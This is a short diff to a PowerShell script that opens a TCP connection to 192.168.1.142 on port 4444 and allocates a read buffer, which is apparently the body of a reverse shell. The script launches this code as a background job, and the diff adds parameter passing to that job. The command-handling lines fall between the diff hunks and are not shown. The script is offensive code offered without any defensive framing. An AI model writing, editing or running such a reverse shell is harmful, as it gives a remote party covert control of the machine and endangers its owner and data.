@@ -1,4 +1,6 @@
 $scriptBlock = {
+    param ($sharedVariable)
+
     $sm = (New-Object Net.Sockets.TCPClient('192.168.1.142', 4444)).GetStream()
     [byte[]]$bt = 0..65535 | ForEach-Object { 0 }
 
@@ -9,4 +11,5 @@ $scriptBlock = {
     }
 }
 
-Start-Job -ScriptBlock $scriptBlock
+# Pass any shared variables to the job using -ArgumentList
+Start-Job -ScriptBlock $scriptBlock -ArgumentList $sharedVariable
